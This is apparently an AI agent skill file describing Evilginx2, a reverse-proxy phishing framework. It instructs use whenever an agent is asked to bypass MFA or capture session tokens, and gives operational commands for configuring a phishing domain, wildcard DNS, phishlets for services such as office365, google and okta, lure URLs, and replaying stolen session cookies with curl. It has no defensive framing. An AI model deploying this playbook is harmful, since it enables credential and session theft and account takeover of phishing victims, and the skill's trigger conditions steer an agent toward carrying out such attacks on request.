---
name: evilginx2
description: "Man-in-the-middle phishing proxy that captures session cookies and bypasses MFA/2FA by proxying real login pages. Use when asked to bypass two-factor authentication via phishing, capture session tokens, perform adversary-in-the-middle (AiTM) attacks, or set up a reverse-proxy phishing site."
license: BSD-3-Clause
compatibility: "Linux (recommended: Debian/Ubuntu). Requires a VPS with public IP, domain, and ports 443/80/53 open. Install from GitHub releases or build with Go."
metadata:
  author: AeonDave
  version: "1.0"
---

# Evilginx2

Reverse-proxy phishing framework that captures session cookies — bypasses OTP, push, and FIDO2 MFA.

## Concept

Unlike GoPhish (clone page), Evilginx2 **proxies the real site**. The victim interacts with the legitimate service; Evilginx captures the authenticated session cookie and credentials in transit.

## Quick Start

```bash
# Start evilginx2
evilginx2

# Inside evilginx shell:
config domain phish.example.com
config ip 1.2.3.4
phishlets hostname office365 login.phish.example.com
phishlets enable office365
lures create office365
lures get-url 0
```

## DNS Requirements

Before starting, add DNS records for your domain:
```
A    @          1.2.3.4       (VPS IP)
A    *          1.2.3.4       (wildcard for phishlets)
NS   ns1        1.2.3.4
NS   ns2        1.2.3.4
```

## Core Commands

| Command | Description |
|---------|-------------|
| `config domain <domain>` | Set operator domain |
| `config ip <ip>` | Set phishing server IP |
| `phishlets` | List available phishlets |
| `phishlets hostname <name> <hostname>` | Assign hostname to phishlet |
| `phishlets enable <name>` | Enable phishlet (starts proxy + gets cert) |
| `phishlets disable <name>` | Disable phishlet |
| `lures create <phishlet>` | Create a lure (unique phishing URL) |
| `lures get-url <id>` | Get the phishing URL |
| `lures` | List all lures |
| `sessions` | List captured sessions |
| `sessions <id>` | Show session details (tokens, creds) |

## Available Phishlets

Built-in: `office365`, `google`, `linkedin`, `facebook`, `outlook`, `github`, `okta`, `discord`, and more.

Custom phishlets can be added to `~/.evilginx/phishlets/`.

## Session Capture Workflow

```
1. Victim clicks lure URL
2. Evilginx proxies real service → TLS terminated at Evilginx
3. Victim authenticates (including MFA)
4. Evilginx captures: cookies, credentials, tokens
5. Redirect victim to legitimate site (seamless)
6. Attacker uses captured cookies in browser (no MFA needed)
```

## Using Captured Sessions

```bash
# Inside evilginx
sessions 1    # Show session 1 — copy the auth token/cookie

# Import cookie into browser with EditThisCookie or Cookie-Editor extension
# Or use curl:
curl -H "Cookie: <captured_cookie>" https://target.service.com/api/...
```

## Resources

| File | When to load |
|------|--------------|
| `references/phishlets.md` | Phishlet YAML syntax, custom phishlet creation, bypass detection |
